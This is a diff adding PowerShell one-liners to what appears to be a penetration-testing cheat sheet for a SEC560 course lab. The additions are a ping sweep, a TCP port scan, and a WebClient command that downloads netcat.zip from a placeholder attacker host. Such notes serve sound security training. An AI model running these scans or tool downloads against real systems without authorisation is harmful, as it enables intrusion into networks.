@@ -28,6 +28,25 @@ tcpdump -nn tcp and port 80 and host 10.10.10.10
 echo "" | nc -nvw2 10.10.10.60 20-80
 ```
 
+### Powershell commands
+
+#### Ping scan
+
+```
+1..60 | % { echo $_; ping -n 1 -w 100 10.10.10.$_ | select-string ttl }
+```
+#### Port scan
+
+```
+70..90 | % {echo $_; echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.50", $_)) "Port $_ is open" } 2>$null
+```
+#### Transfer files
+
+```
+(New-Object System.Net.WebClient).DownloadFile("http://YOUR_LINUX_IP_ADDRESS/SEC560/netcat.zip","netcat.zip")
+```
+
+
 ### IPv6 scans
 
 multicast scan   
